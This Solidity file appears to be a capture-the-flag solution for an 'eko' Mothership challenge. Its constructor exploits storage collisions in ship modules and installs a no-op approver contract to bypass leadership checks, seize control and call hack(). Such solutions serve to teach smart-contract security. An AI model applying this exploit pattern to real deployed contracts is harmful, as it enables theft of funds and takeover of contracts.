// SPDX-License-Identifier: AGPL-3.0-or-later
pragma solidity 0.8.17;

import { Mothership, SpaceShip, CleaningModule, RefuelModule } from "eko/ChallengeMothership.sol";

contract MothershipCracker {
  constructor(Mothership mothership) {
    SpaceShip ship = mothership.fleet(0);
    CleaningModule(address(ship)).replaceCleaningCompany(address(0));
    RefuelModule(address(ship)).addAlternativeRefuelStationsCodes(uint160(address(this)));
    ship.askForNewCaptain(address(this));

    ApproverModule approver = new ApproverModule();
    uint256 fleetLength = mothership.fleetLength();
    for (uint256 i = 1; i < fleetLength; ++i) {
      ship = mothership.fleet(i);
      CleaningModule(address(ship)).replaceCleaningCompany(address(this));
      ship.addModule(ApproverModule.isLeaderApproved.selector, address(approver));
    }

    mothership.promoteToLeader(address(this));
    mothership.hack();
  }
}

contract ApproverModule {
  function isLeaderApproved(address) external pure {}
}
